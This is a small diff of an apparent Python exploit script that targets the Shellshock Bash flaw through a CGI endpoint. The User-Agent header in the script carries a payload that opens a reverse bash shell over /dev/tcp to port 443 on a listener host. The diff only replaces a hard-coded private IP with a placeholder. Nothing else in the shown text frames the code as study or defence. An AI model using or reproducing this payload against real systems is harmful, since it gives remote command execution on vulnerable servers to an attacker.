@@ -59,7 +59,7 @@ main_url = "http://ADDIP/cgi-bin/addPATH"
 
 def shellshock():
     headers = {
-        "User-Agent": "() { :; }; echo; /bin/bash -i >& /dev/tcp/192.168.1.43/443 0>&1"
+        "User-Agent": "() { :; }; echo; /bin/bash -i >& /dev/tcp/ipnumber/443 0>&1"
     }
     r = requests.get(main_url, headers=headers)
 
